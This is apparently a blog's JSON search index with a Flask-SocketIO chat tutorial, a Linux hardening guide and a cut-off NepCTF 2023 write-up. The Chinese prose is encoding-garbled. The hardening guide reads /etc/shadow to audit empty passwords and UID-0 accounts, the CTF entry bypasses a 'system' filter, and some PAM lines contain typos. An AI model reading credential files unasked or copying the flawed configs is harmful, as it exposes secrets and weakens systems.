b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'\n\n```\n\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ","url":"/åŸºäºFlask-websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ/","content":"\n# åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ\n\nâ€‹          webå¼€å‘å°±æ˜¯åŸºäºæµè§ˆå™¨è¿›è¡Œäººæœºäº¤äº’ï¼Œå½“è®¿å®¢ç™»å½•åˆ°æŒ‡å®šç½‘å€åï¼Œä¸ä»…å¯ä»¥çœ‹åˆ°æµè§ˆå™¨æ¸²æŸ“çš„ç”»é¢ï¼ŒåŒæ—¶è¿˜å¯ä»¥ä¸åå°è¿›è¡Œä¸€äº›æ“ä½œï¼Œå†é€šè¿‡æµè§ˆå™¨è¿”å›åå°æœåŠ¡å™¨å¤„ç†çš„ç»“æœï¼Œè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨æ‘¸ç´¢åˆ©ç”¨flaskæ¡†æ¶æ¥åšç‚¹æœ‰æ„æ€çš„äº‹\n\n## ä»€ä¹ˆæ˜¯Flaskï¼Ÿ\n\n`Flask`æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ Python web å¼€å‘æ¡†æ¶ï¼Œå®ƒä¸ºå¼€å‘è€…æä¾›äº†ä¸€ä¸ªç®€å•ã€ç›´è§‚çš„æ–¹å¼æ¥åˆ›å»º web åº”ç”¨ã€‚ç”±äºå…¶â€œå¾®â€ç‰¹æ€§ï¼Œä½ å¯ä»¥ä»ä¸€ä¸ªç®€å•çš„å•æ–‡ä»¶åº”ç”¨å¼€å§‹ï¼Œç„¶åæ ¹æ®éœ€è¦å¢åŠ æ›´å¤šåŠŸèƒ½ã€‚\n\n## Websockets å’Œ Flask-SocketIO\n\n`Websockets` æ˜¯ä¸€ä¸ªç½‘ç»œé€šä¿¡åè®®ï¼Œå…è®¸æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡ŒåŒå‘å®æ—¶é€šä¿¡ã€‚ä¸ä¼ ç»Ÿçš„ HTTP è¯·æ±‚ç›¸æ¯”ï¼ŒWebsockets æä¾›äº†ä¸€ä¸ªæŒä¹…çš„è¿æ¥ï¼Œä½¿å¾—æ•°æ®èƒ½å¤Ÿå®æ—¶ã€é«˜æ•ˆåœ°åœ¨åŒæ–¹ä¹‹é—´æµåŠ¨ã€‚\n`Flask-SocketIO` åˆ™æ˜¯ä¸€ä¸ª Flask æ’ä»¶ï¼Œå®ƒä½¿å¾—åœ¨ Flask åº”ç”¨ä¸­é›†æˆ Websockets å˜å¾—éå¸¸ç®€å•ã€‚ä¸ä»…å¦‚æ­¤ï¼Œå®ƒè¿˜æä¾›äº†ä¸€ç³»åˆ—çš„é«˜çº§åŠŸèƒ½ï¼Œå¦‚å¹¿æ’­ã€å‘½åç©ºé—´å’Œæˆ¿é—´æ”¯æŒï¼Œä½¿å¾—åˆ›å»ºå¤æ‚çš„å®æ—¶åº”ç”¨å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚\n\n## å¤§æ¦‚åŠŸèƒ½\n\nç”¨æˆ·ç®¡ç†åŠŸèƒ½ï¼šåŒ…æ‹¬è´¦å·ç™»å½•ã€æ³¨å†Œç­‰åŠŸèƒ½ã€‚\n\nå¥½å‹ç®¡ç†åŠŸèƒ½ï¼šå…è®¸ç”¨æˆ·æ·»åŠ å’Œåˆ é™¤å¥½å‹ã€‚\n\nå³æ—¶èŠå¤©åŠŸèƒ½ï¼šç”¨æˆ·å¯ä»¥è¿›è¡Œå®æ—¶çš„èŠå¤©ï¼Œå¹¶ä¸”é€šè¿‡@ç”¨æˆ·å å¯ä»¥è¿›è¡Œç§èŠã€‚\n\n```bash\n'/'ï¼ˆé¦–é¡µï¼‰ï¼šå¦‚æœç”¨æˆ·æœªç™»å½•ï¼Œåˆ™é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦åˆ™ï¼Œé‡å®šå‘åˆ°èŠå¤©é¡µé¢ã€‚\n'/login'ï¼šå¤„ç†ç”¨æˆ·ç™»å½•ï¼Œæ£€æŸ¥å‡­æ®æ˜¯å¦ä¸æ•°æ®åº“åŒ¹é…ã€‚\n'/chat'ï¼šå¦‚æœç”¨æˆ·å·²ç™»å½•ï¼Œåˆ™æ¸²æŸ“èŠå¤©é¡µé¢ï¼›å¦åˆ™ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚\n'/logout'ï¼šé€šè¿‡åˆ é™¤ç”¨æˆ·çš„ä¼šè¯æ¥æ³¨é”€ç”¨æˆ·ã€‚\n'/register'ï¼šå¤„ç†ç”¨æˆ·æ³¨å†Œï¼Œæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å”¯ä¸€ï¼Œå¹¶å°†ç”¨æˆ·æ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚\nå®šä¹‰WebSocketå¤„ç†ç¨‹åºï¼š\n\n'message'ï¼šå¤„ç†ä¼ å…¥çš„èŠå¤©æ¶ˆæ¯å¹¶å°†å…¶å¹¿æ’­åˆ°é€‚å½“çš„æˆ¿é—´ã€‚\n'join'ï¼šå¤„ç†ç”¨æˆ·åŠ å…¥èŠå¤©æˆ¿é—´å¹¶æ›´æ–°æˆ¿é—´ä¸­åœ¨çº¿ç”¨æˆ·çš„åˆ—è¡¨ã€‚\n'leave'ï¼šå¤„ç†ç”¨æˆ·ç¦»å¼€èŠå¤©æˆ¿é—´å¹¶æ›´æ–°æˆ¿é—´ä¸­åœ¨çº¿ç”¨æˆ·çš„åˆ—è¡¨ã€‚\nåœ¨if __name__ == '__main__':éƒ¨åˆ†ï¼Œåˆ›å»ºæ•°æ®åº“è¡¨å¹¶è¿è¡Œåº”ç”¨ç¨‹åºï¼Œå…è®¸WebSocketé€šä¿¡ä»¥å®æ—¶å¤„ç†èŠå¤©æ¶ˆæ¯ã€‚\n```\n\n## åˆ›å»ºåœ¨çº¿èŠå¤©ç³»ç»Ÿ\n\n1. å®‰è£…å¿…è¦çš„åº“ï¼š\n\n```python\npip install Flask flask-socketio\n```\n\n2. åˆå§‹åŒ–Flask åº”ç”¨å¹¶é›†æˆSocketIOï¼š\n\n```python\nfrom flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify\nfrom flask_socketio import SocketIO, join_room, leave_room, emit\n\n\napp = Flask(__name__)\nsocketio = SocketIO(app)\n```\n\n3. å®šä¹‰ç®€å•çš„è·¯ç”±ä¸€å‘ˆç°èŠå¤©å®¤çš„å‰ç«¯ç•Œé¢:\n\n```python\n@app.route('/')\ndef index():\n    if 'username' in session:\n        return redirect(url_for('chat'))\n    return render_template('login.html')\n```\n\n4. ä¸ºèŠå¤©å®¤äº‹ä»¶ï¼ˆå¦‚åŠ å…¥ã€å‘é€æ¶ˆæ¯å’Œç¦»å¼€ï¼‰æ·»åŠ  SocketIO äº‹ä»¶å¤„ç†å‡½æ•°ï¼š\n\n```python\n@socketio.on('join')\ndef join(data):\n    room = data['room']\n    join_room(room)\n    online_users.add(session['username'])\n    emit('update_online_users', {'online_users': list(online_users)}, room=room)\n\n\n@socketio.on('leave')\ndef leave(data):\n    room = data['room']\n    leave_room(room)\n    online_users.remove(session['username'])\n    emit('update_online_users', {'online_users': list(online_users)}, room=room)\n```\n\n5. æœ€åå¯åŠ¨flaskåº”ç”¨ï¼š\n\n```python\nif __name__ == '__main__':\n    with app.app_context():\n        db.create_all()\n        socketio.run(app, debug=True)\n        # socketio.run(app, host='0.0.0.0', port=80)\n```\n\n## é¡¹ç›®å±•ç¤º\n\nç”±äºç¯‡å¹…æœ‰é™ï¼Œå¦‚éœ€ç³»ç»Ÿå®Œæ•´ä»£ç ï¼Œå¯ç‚¹å‡»ä¸»é¡µæ·»åŠ QQè·å–\n\n![image-20230919163904624](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230919163904624.png)\n\n## æ€»ç»“\n\nå€ŸåŠ© Flask å’Œ Flask-SocketIOï¼Œä½ å¯ä»¥è½»æ¾åˆ›å»ºä¸€ä¸ªåŠŸèƒ½é½å…¨çš„åœ¨çº¿èŠå¤©å®¤ã€‚è€Œ Websockets ä¿è¯äº†æ•°æ®åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„å®æ—¶äº¤äº’ï¼Œä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªæ— ç¼çš„ä½“éªŒã€‚è¿™åªæ˜¯ä¸€ä¸ªåŸºç¡€æ¡ˆä¾‹ï¼Œé€šè¿‡è¯¥æ¡ˆä¾‹æˆ‘ä»¬å¯ä»¥å°è¯•æ‰©å±•å‡ºå¾ˆå¤šåŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨çº¿å®¢æœç­‰ï¼Œå¹¶ä¸æ•°æ®åº“ç­‰æŠ€æœ¯ç»“åˆèµ·æ¥ï¼Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šå®ç°ä¸€ä¸ªè‡ªå·±çš„é€šä¿¡ç³»ç»Ÿã€‚\n","tags":["Python","html","javascript","css","flask","websocket"],"categories":["Python"]},{"title":"Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º","url":"/Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º/","content":"\n# Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º\n\n## ç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹\n\n- è´¦å·å®‰å…¨\n  - ç©ºå£ä»¤ç”¨æˆ·\n  - umaskå€¼çš„é‡è¦æ€§\n  - suçš„é™åˆ¶\n  - å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ\n  - å¯†ç å¤æ‚æ€§\n- ç³»ç»Ÿå®‰å…¨åŸºçº¿\n  - æ£€æŸ¥grubå¯†ç \n  - ä¿®æ”¹å†…æ ¸ç½‘ç»œå‚æ•°\n  - ç¦æ­¢Control-Alt-Deleteé”®ç›˜å…³é—­å‘½ä»¤\n  - ä¿®æ”¹å‘½ä»¤å†å²è®°å½•æ¡ç›®æ•°ä»¥åŠæ—¶é—´æ ‡ç­¾\n  - è®¾ç½®ç™»å½•è¶…æ—¶æ—¶é—´\n\n### ç©ºå£ä»¤ç”¨æˆ·\n\n![image-20230823153358927](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823153358927.png)\n\nåˆ©ç”¨`cat /etc/shadow`æŒ‡ä»¤ï¼Œä¸Šå›¾**kali**åçš„ä¸ºç”¨æˆ·çš„å¯†ç ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤ï¼Œä½†æ˜¯ï¼Œè¿™ç§æ–¹æ³•å®¹æ˜“çœ‹æ¼ç›¸å…³ä¿¡æ¯\n\n1. ç©ºå£ä»¤å’Œéšè—ç®¡ç†å‘˜æ£€æŸ¥\n\n```bash\n$1 ç”¨æˆ·å  \n$2 å¯†ç å ç”¨ç¬¦\n$3 UID\n$4 ç»„\n```\n\n![image-20230823160310527](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823160310527.png)\n\nä½¿ç”¨å‘½ä»¤`awk -F: '($2==\"\"){print $1}' /etc/shadow`æŸ¥çœ‹ç©ºå£ä»¤è´¦å·  **$1ä¸ºç¬¬ä¸€ä¸ªå­—æ®µå³ç”¨æˆ·å**\n\n![image-20230823154237648](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823154237648.png)\n\nä½¿ç”¨å‘½ä»¤`awk -F: '($3==0){print $1}' /etc/passwd`æŸ¥çœ‹UIDä¸º0çš„è´¦å·\n\n![image-20230823161402210](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823161402210.png)\n\n### umaskå€¼çš„é‡è¦æ€§\n\n![image-20230823162331670](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823162331670.png)\n\n`umask`ä½œç”¨ï¼šä¸»è¦æ˜¯é’ˆå¯¹æ–°åˆ›å»ºçš„æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œæ¯”å¦‚ä½ umaskè®¾ç½®çš„æ˜¯022 é‚£ä½ åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶é»˜è®¤çš„æƒé™å°±æ˜¯644 (644çš„äºŒè¿›åˆ¶ 110 010 010)å±ä¸»è¯»å†™ åŒç»„è¯» å…¶ä»–ç”¨æˆ·è¯»\n\n**rwx  =>  r=read(è¯»å–) w=write(å†™å…¥) x(exe)(æ‰§è¡Œ)**\n\n\n\n![image-20230823162541325](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823162541325.png)\n\n### é™åˆ¶ç”¨æˆ·ä½¿ç”¨su\n\nä½¿ç”¨å‘½ä»¤`vim /etc/pasm.d/su` ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå»é™¤ç¬¬å…­è¡Œçš„æ³¨é‡Šç¬¦å·ï¼Œè¡¨ç¤ºåœ¨wheelç»„ä¸­çš„ç”¨æˆ·æ‰èƒ½å¤ŸæˆåŠŸä½¿ç”¨suå‘½ä»¤ï¼Œå…¶ä»–ç”¨æˆ·æ— æ³•ä½¿ç”¨ã€‚å¦‚æœéœ€è¦å…¶ä»–ç»„æ”¯æŒè¯¥åŠŸèƒ½å¯ä»¥æ·»åŠ å†…å®¹ã€‚\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823164802724.png\" alt=\"image-20230823164802724\" style=\"zoom:80%;\" />\n\nä¾‹å¦‚ï¼šåªå…è®¸testç»„ç”¨æˆ·suåˆ°root\n\n`auth required pam_wheel.so group=test`\n\n### å¯†ç æœ€é•¿æœ‰æ•ˆæœŸ\n\nåœ¨æ–‡ä»¶`/etc/login.defs` ä¸­è¿›è¡Œè®¾ç½®å¦‚ä¸‹å‚æ•°\n\n```bash\nPASS_MAX_DAYS   180  #å¯†ç æœ€é•¿è¿‡æœŸå¤©æ•°\nPASS_MIN_DAYS   30  #å¯†ç æœ€å°è¿‡æœŸå¤©æ•°\nPASS_MIN_LEN    12  #å¯†ç æœ€å°é•¿åº¦\nPASS_WARN_AGE   20   #å¯†ç è¿‡æœŸè­¦å‘Šå¤©æ•°\n```\n\n![image-20230824153717146](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230824153717146.png)\n\n### å¯†ç å¤æ‚æ€§\n\n- æ–‡ä»¶ç¼–è¾‘\n  - `/etc/pam.d/system-auth` \n  - Debianç³»åˆ—ç³»ç»Ÿï¼š`/etc/pam.d/common-password`\n\n#### å¯†ç å†å²æˆ–æ‹’ç»é‡å¤ä½¿ç”¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ\n\nè¿™ä¸ªå‚æ•°æ§åˆ¶å¯†ç å†å²ã€‚å®ƒè®°å½•æ›¾ç»ä½¿ç”¨è¿‡çš„å¯†ç ï¼ˆç¦æ­¢ä½¿ç”¨çš„æ›¾ç”¨å¯†ç çš„ä¸ªæ•°ï¼‰ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°çš„å¯†ç æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥å¯†ç å†å²ï¼Œå¦‚æœä»–ä»¬è¦è®¾ç½®çš„å¯†ç æ˜¯ä¸€ä¸ªæ›¾ç»ä½¿ç”¨è¿‡çš„æ—§å¯†ç ï¼Œå°†ä¼šå‘å‡ºè­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®å¯†ç å†å²ä¸º 5ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\npassword  sufficient  pam_unix.so md5 shadow nullok try_first_pass use_authtok remember=5\n```\n\n#### å¯†ç æœ€å°é•¿åº¦æ˜¯ä»€ä¹ˆï¼Ÿ\n\nè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç çš„æœ€å°é•¿åº¦ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœæ–°è®¾çš„å¯†ç é•¿åº¦å°äºè¿™ä¸ªå‚æ•°è®¾ç½®çš„å€¼ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®æœ€å°å¯†ç é•¿åº¦ä¸º 12ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\npassword  requisite   pam_cracklib.so try_first_pass retry=3 minlen=12\n```\n\n`try_first_pass retry=3`ï¼šåœ¨å¯†ç è®¾ç½®äº¤äº’ç•Œé¢ï¼Œç”¨æˆ·æœ‰ 3 æ¬¡æœºä¼šé‡è®¾å¯†ç ã€‚\n\n#### è®¾ç½®æœ€å°‘çš„å¤§å†™å­—æ¯ä¸ªæ•°ï¼Ÿ\n\nè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„å¤§å†™å­—æ¯çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰å¤§å†™å­—æ¯ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®å¯†ç ï¼ˆä¸­çš„å¤§å†™å­—æ¯ï¼‰çš„æœ€å°é•¿åº¦ä¸º 1 ä¸ªå­—æ¯ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\npassword   requisite   pam_cracklib.so try_first_pass retry=3 minlen=12 ucredit=-1\n```\n\n#### è®¾ç½®æœ€å°‘çš„å°å†™å­—æ¯ä¸ªæ•°ï¼Ÿ\n\nè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„å°å†™å­—æ¯çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰å°å†™å­—æ¯ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªå­—æ¯ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\npassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 lcredit=-1\n```\n\n#### è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„æ•°å­—ä¸ªæ•°ï¼Ÿ\n\nè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„æ•°å­—çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰æ•°å­—ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªæ•°å­—ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\npassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 dcredit=-1\n```\n\n#### è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„å…¶ä»–å­—ç¬¦ï¼ˆç¬¦å·ï¼‰ä¸ªæ•°ï¼Ÿ\n\nè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„ç‰¹æ®Šç¬¦å·çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰ç‰¹æ®Šç¬¦å·ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªå­—ç¬¦ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\npassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 ocredit=-1\n```\n\n#### è®¾ç½®è´¦å·é”å®šï¼Ÿ\n\nè¿™ä¸ªå‚æ•°æ§åˆ¶ç”¨æˆ·è¿ç»­ç™»å½•å¤±è´¥çš„æœ€å¤§æ¬¡æ•°ã€‚å½“è¾¾åˆ°è®¾å®šçš„è¿ç»­å¤±è´¥ç™»å½•æ¬¡æ•°é˜ˆå€¼æ—¶ï¼Œé”å®šè´¦å·ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\nauth        required      pam_tally2.so onerr=fail audit silent deny=5\naccount required pam_tally2.so\n```\n\n#### è®¾å®šè´¦å·è§£é”æ—¶é—´ï¼Ÿ\n\nè¿™ä¸ªå‚æ•°è¡¨ç¤ºç”¨æˆ·è§£é”æ—¶é—´ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·è´¦å·åœ¨è¿ç»­è®¤è¯å¤±è´¥åè¢«é”å®šäº†ï¼Œå½“è¿‡äº†è®¾å®šçš„è§£é”æ—¶é—´åï¼Œæ‰ä¼šè§£é”ã€‚è®¾ç½®è¢«é”å®šä¸­çš„è´¦å·çš„è§£é”æ—¶é—´ï¼ˆ900 ç§’ = 15åˆ†é’Ÿï¼‰ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ `/etc/pam.d/system-auth` æ–‡ä»¶ä¸­è®¾ç½®ã€‚\n\n```bash\n# vi /etc/pam.d/system-auth\nauth        required      pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900\naccount required pam_tally2.so\n```\n\næ¥æº:https://linux.cn/\n\n### æ£€æŸ¥grubå¯†ç \n\n\n\n## å¼±å£ä»¤é˜²èŒƒï¼Œæš´åŠ›ç ´è§£é˜²å¾¡\n\n- è®¾ç½®è¿ç»­è¾“é”™3æ¬¡å¯†ç ï¼Œè´¦å·é”å®š3åˆ†é’Ÿ(kali æ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶)\n\n  - æ–‡ä»¶ç¼–è¾‘\n    - `/etc/pam.d/system-auth`\n    - `/etc/pam.d/password-auth`\n\n  - é…ç½®å†…å®¹ï¼Œåœ¨æºæ–‡ä»¶ç¬¬ä¸€è¡Œä¸‹é…ç½®å¦‚ä¸‹ä¸¤è¡Œ\n  - `auth required pam_tally2.so deny=3 unlock time=30 enven_deny_root root_unlock_time=30`\n  - `account required pam_tally2.so`\n\n","tags":["åŸºçº¿æ£€æŸ¥","Linuxå®‰å…¨åŸºçº¿","å®‰å…¨åŸºçº¿åŠ å›º"],"categories":["åŸºçº¿æ£€æŸ¥","Linux"]},{"title":"NepCTF 2023","url":"/NepCTF-2023/","content":"\n## ä¸AIå…±èˆçš„å“ˆå¤«æ›¼\n\n![image-20230811230746325](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230811230746325.png)\n\n1. ä¸‹è½½æ–‡ä»¶ æºç \n\n```python\nimport heapq\nimport os\n\nclass HuffmanNode:\n    def __init__(self, char, freq):\n        self.char = char\n        self.freq = freq\n        self.left = None\n        self.right = None\n\n    def __lt__(self, other):\n        return self.freq < other.freq\n\ndef build_huffman_tree(frequencies):\n    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]\n    heapq.heapify(heap)\n\n    while len(heap) > 1:\n        left = heapq.heappop(heap)\n        right = heapq.heappop(heap)\n        merged = HuffmanNode(None, left.freq + right.freq)\n        merged.left = left\n        merged.right = right\n        heapq.heappush(heap, merged)\n\n    return heap[0]\n\ndef build_huffman_codes(node, current_code, huffman_codes):\n    if node is None:\n        return\n\n    if node.char is not None:\n        huffman_codes[node.char] = current_code\n        return\n\n    build_huffman_codes(node.left, current_code + '0', huffman_codes)\n    build_huffman_codes(node.right, current_code + '1', huffman_codes)\n\ndef compress(input_file, output_file):\n    with open(input_file, 'rb') as f:\n        data = f.read()\n\n    frequencies = {}\n    for byte in data:\n        if byte not in frequencies:\n            frequencies[byte] = 0\n        frequencies[byte] += 1\n\n    root = build_huffman_tree(frequencies)\n    huffman_codes = {}\n    build_huffman_codes(root, '', huffman_codes)\n\n    compressed_data = ''\n    for byte in data:\n        compressed_data += huffman_codes[byte]\n\n    padding = 8 - len(compressed_data) % 8\n    compressed_data += '0' * padding\n\n    with open(output_file, 'wb') as f:\n        # Write frequency information\n        f.write(bytes([len(frequencies)]))\n        for byte, freq in frequencies.items():\n            f.write(bytes([byte, (freq >> 24) & 0xFF, (freq >> 16) & 0xFF, (freq >> 8) & 0xFF, freq & 0xFF]))\n\n        # Write compressed data\n        for i in range(0, len(compressed_data), 8):\n            byte = compressed_data[i:i+8]\n            f.write(bytes([int(byte, 2)]))\n\nif __name__ == \"__main__\":\n    input_file = 'input.txt'\n    compressed_file = 'compressed.bin'\n    decompressed_file = 'decompressed.txt'\n\n    # å‹ç¼©æ–‡ä»¶\n    compress(input_file, compressed_file)\n\n    # è§£å‹ç¼©æ–‡ä»¶\n    decompress(compressed_file, decompressed_file)\n```\n\n2. è§‚å¯Ÿæºç å‘ç° ç¼ºå°‘è§£å‹ç¼©å‡½æ•° ç¼–å†™è§£å‹ç¼©å‡½æ•°\n\n```python\ndef decompress(input_file, output_file):\n    # è¯»å–å‹ç¼©æ–‡ä»¶ä¸­çš„æ•°æ®\n    with open(input_file, 'rb') as f:\n        compressed_data = f.read()\n        # print(compressed_data)\n    # è¯»å–é¢‘ç‡ä¿¡æ¯\n    num_symbols = compressed_data[0]\n    # print(num_symbols)\n    frequencies = {}\n    index = 1\n    for _ in range(num_symbols):\n        symbol = compressed_data[index]\n        # print(symbol)\n        freq = (compressed_data[index + 1] << 24) | (compressed_data[index + 2] << 16) | (compressed_data[index + 3] << 8) | compressed_data[index + 4]\n        frequencies[symbol] = freq\n        index += 5\n\n    # é‡å»º Huffman æ ‘\n    root = build_huffman_tree(frequencies)\n\n    # è§£å‹ç¼©æ•°æ®\n    current_node = root\n    decompressed_data = []\n    for byte in compressed_data[index:]:\n        byte_value = int(byte)\n        for i in range(7, -1, -1):\n            bit = (byte_value >> i) & 1\n            if bit == 0:\n                current_node = current_node.left\n            else:\n                current_node = current_node.right\n\n            if current_node.char is not None:\n                decompressed_data.append(current_node.char)\n                current_node = root\n\n    # å°†è§£å‹ç¼©åçš„æ•°æ®å†™å…¥æ–‡ä»¶\n    with open(output_file, 'wb') as f:\n        f.write(bytes(decompressed_data))\n```\n\n3. è¿è¡Œä»£ç å¾—åˆ°`decompressed.txt`\n\n![image-20230811231022544](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230811231022544.png)\n\n\n\n## codes\n\n![image-20230814145755134](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814145755134.png)\n\n1. è¿›å…¥è®¿é—®é¡µé¢åï¼š\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814145936294.png\" alt=\"image-20230814145936294\" style=\"zoom:67%;\" />\n\n2. è§‚å¯Ÿå¾—åˆ° éœ€è¦è¾“å…¥Cè¯­è¨€ä»£ç ï¼Œè¾“å…¥systemåæ²¡æœ‰æ­£å¸¸æ˜¾ç¤ºï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¢«è¿‡æ»¤äº†\n\n3. äºæ˜¯é€šè¿‡`argv` ç›´æ¥æ‰“å°å‘½ä»¤è¡Œå‚æ•°\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char **argv) {\n    // æ‰“å°å‘½ä»¤è¡Œå‚æ•°\n    printf(\"Command line arguments:\\n\");\n    for (int i = 0; i < 